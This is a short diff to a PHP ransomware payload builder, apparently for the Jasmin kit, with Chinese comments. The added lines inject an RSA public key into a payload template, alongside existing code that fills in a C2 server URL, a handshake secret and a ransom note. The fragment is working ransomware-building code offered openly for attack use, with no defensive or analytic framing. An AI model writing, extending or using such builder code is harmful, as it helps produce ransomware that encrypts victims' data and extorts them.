@@ -40,6 +40,14 @@ $tpl = file_get_contents($tpl_path);
 $tpl = str_replace('{{C2_URL}}', $c2_url, $tpl);
 $tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);
 
+// 注入RSA公钥
+$pub_path = __DIR__ . '/payloads/jasmin_public.pem';
+if (file_exists($pub_path)) {
+    $tpl = str_replace('{{RSA_PUBLIC_KEY}}', trim(file_get_contents($pub_path)), $tpl);
+} else {
+    echo json_encode(['ok'=>false,'msg'=>'RSA公钥缺失，请先生成密钥对']); exit;
+}
+
 // 构建勒索信文本
 $note = build_ransom_note($ransom, $platform);
 $tpl = str_replace('{{RANSOM_NOTE}}', addcslashes($note, "'\"\\"), $tpl);
